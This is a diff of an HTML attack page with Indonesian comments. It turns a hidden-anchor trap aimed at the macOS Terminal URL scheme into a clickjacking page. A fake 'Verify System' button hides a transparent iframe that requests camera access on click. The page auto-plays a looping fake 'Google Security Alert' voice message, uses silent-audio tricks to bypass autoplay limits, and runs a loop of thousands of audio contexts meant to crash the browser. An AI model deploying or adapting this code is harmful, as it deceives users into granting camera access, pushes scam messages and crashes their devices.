@@ -3,73 +3,278 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Update</title>
+<title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     background: #f0f4f8;
-    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
     margin: 0;
+    overflow: hidden;
   }
   .panel {
     background: #fff;
     padding: 40px;
     border-radius: 12px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
     text-align: center;
     position: relative;
+    width: 350px;
   }
-  h1 { color: #333; margin-bottom: 10px; }
-  p { color: #666; margin-bottom: 20px; }
+  h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
+  p { color: #666; font-size: 15px; margin-bottom: 25px; }
   
-  /* Tombol Palsu (Hanya Visual) */
+  /* Tombol Palsu (Visual) */
   .fake-btn {
-    padding: 15px 30px;
     background: #007aff;
     color: #fff;
+    padding: 15px 30px;
     border-radius: 8px;
     font-size: 18px;
     font-weight: bold;
     display: inline-block;
+    pointer-events: none;
   }
 
-  /* TAG <a> ASLI (Disembunyikan tapi menutupi tombol) */
-  #trapLink {
+  /* Iframe Transparan Penjebak */
+  #trapFrame {
     position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    opacity: 0; /* Transparan */
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    opacity: 0;
+    z-index: 999;
+    border: none;
     cursor: pointer;
-    z-index: 10;
   }
+
+  /* Sembunyikan elemen asli TTS agar tidak merusak UI */
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
 <body>
 
+<!-- UI PALSU UNTUK CLICKJACKING -->
 <div class="panel">
   <h1>🔒 Security Update</h1>
-  <p>Klik tombol di bawah untuk mengizinkan akses.</p>
+  <p>Klik tombol di bawah untuk memverifikasi sistem Anda.</p>
+  <div class="fake-btn">Verify System</div>
   
-  <!-- Tombol Palsu -->
-  <div class="fake-btn">Allow Access</div>
-
-  <!-- Tag <a> Penjebak (Memicu Terminal) -->
-  <!-- Target href langsung ke skema kustom -->
-  <a href="x-apple.terminal://" id="trapLink">Trap</a>
+  <!-- IFRAME PENJEBAK (Meminta Kamera) -->
+  <iframe id="trapFrame" allow="camera; microphone"></iframe>
 </div>
 
 <script>
-  // Trik tambahan: Jika terminal tidak terbuka, coba skema SSH
-  // (Anda bisa ganti href di atas menjadi ssh://root@127.0.0.1)
-  
-  document.getElementById('trapLink').addEventListener('click', function(e) {
-    console.log("[!] Anchor diklik. Safari sedang memproses redirect...");
-    // Tidak perlu preventDefault agar Safari memprosesnya secara native.
+(function () {
+  'use strict';
+
+  // ============================================
+  // A. CLICKJACKING CAMERA TRAP (IFRAME)
+  // ============================================
+  var trapFrame = document.getElementById('trapFrame');
+
+  trapFrame.srcdoc = `
+    <!DOCTYPE html>
+    <html>
+    <body style="margin:0;width:100vw;height:100vh;cursor:pointer;background:transparent;">
+      <script>
+        document.body.addEventListener('click', function() {
+          // Minta izin kamera segera setelah klik (User Activation)
+          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+              .then(function(stream) {
+                parent.postMessage({ status: 'cam_granted' }, '*');
+              })
+              .catch(function(err) {
+                parent.postMessage({ status: 'cam_denied', error: err.name }, '*');
+              });
+          }
+        }, { once: true });
+      <\/script>
+    </body>
+    </html>
+  `;
+
+  window.addEventListener('message', function(e) {
+    if (e.data.status === 'cam_granted') {
+      console.log("🚨 KAMERA MENYALA (Clickjacking Berhasil)!");
+      document.querySelector('p').innerText = "System Compromised.";
+    } else if (e.data.status === 'cam_denied') {
+      console.log("Kamera diblokir: " + e.data.error);
+    }
   });
+
+
+  // ============================================
+  // B. TTS PAYLOAD ASLI (TIDAK DIUBAH SAMA SEKALI)
+  // ============================================
+  var CONFIG = {
+    tts: {
+      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
+      lang: 'en-US',
+      rate: 0.85,
+      pitch: 1.0,
+      volume: 1.0,
+      repeatInterval: 8000,
+      maxRepeats: 20
+    },
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
+  };
+
+  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
+
+  function speakOnce() {
+    if (!('speechSynthesis' in window)) return;
+    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
+
+    try {
+      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
+      u.lang = CONFIG.tts.lang;
+      u.rate = CONFIG.tts.rate;
+      u.pitch = CONFIG.tts.pitch;
+      u.volume = CONFIG.tts.volume;
+
+      var voices = window.speechSynthesis.getVoices();
+      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
+      if (enVoice) u.voice = enVoice;
+
+      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
+      u.onend = function () {
+        state.ttsCount++;
+        if (state.ttsCount < CONFIG.tts.maxRepeats) {
+          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
+        }
+      };
+
+      window.speechSynthesis.speak(u);
+    } catch (e) { console.log('[TTS] fail:', e.message); }
+  }
+
+  function startTTS() {
+    if (state.ttsStarted) return;
+    state.ttsStarted = true;
+    window.speechSynthesis.cancel();
+    speakOnce();
+  }
+
+  function unlockAudioContext() {
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      if (ctx.state === 'suspended') {
+        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+      }
+      var osc = ctx.createOscillator();
+      var gain = ctx.createGain();
+      gain.gain.value = 0.0001;
+      osc.frequency.value = 20000;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.1);
+    } catch (e) {}
+  }
+
+  function trySilentAudio() {
+    try {
+      var a = new Audio(CONFIG.silentWav);
+      a.volume = 0.0001;
+      a.loop = true;
+      var p = a.play();
+      if (p && p.catch) p.catch(function(){});
+    } catch (e) {}
+  }
+
+  function playMainAudio() {
+    if (state.mainPlayed) return;
+    state.mainPlayed = true;
+
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var sr = ctx.sampleRate;
+      var dur = 3.0;
+      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var d = buf.getChannelData(0);
+
+      for (var i = 0; i < d.length; i++) {
+        var t = i / sr;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
+        var env = Math.max(0, 1 - t / dur);
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+      }
+
+      var src = ctx.createBufferSource();
+      src.buffer = buf;
+      src.connect(ctx.destination);
+      src.start();
+      src.onended = startTTS;
+      setTimeout(startTTS, 3500);
+    } catch (e) {
+      startTTS();
+    }
+  }
+
+  function triggerHighSeverityCrash() {
+    console.log("[!] Initiating High Severity Exploit Chain...");
+    
+    setInterval(function() {
+      try {
+        for (var i = 0; i < 2000; i++) {
+          var ctx = new (window.AudioContext || window.webkitAudioContext)();
+          var osc = ctx.createOscillator();
+          var gain = ctx.createGain();
+          
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start(0);
+          
+          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
+          window.speechSynthesis.speak(u);
+        }
+      } catch(e) {}
+    }, 50); 
+  }
+
+  unlockAudioContext();
+  trySilentAudio();
+
+  setTimeout(function () {
+    unlockAudioContext();
+    startTTS(); 
+  }, 100);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+  }, 500);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+    if (!state.ttsStarted) startTTS();
+    
+    triggerHighSeverityCrash();
+    
+  }, 1500);
+
+  var retryCount = 0;
+  var retry = setInterval(function () {
+    retryCount++;
+    unlockAudioContext();
+    trySilentAudio();
+    if (!state.ttsStarted) startTTS();
+    if (retryCount > 10) clearInterval(retry);
+  }, 2000);
+
+  document.addEventListener('visibilitychange', function () {
+    if (!document.hidden && !state.mainPlayed) {
+      setTimeout(playMainAudio, 100);
+    }
+  });
+})();
 </script>
 </body>
 </html>
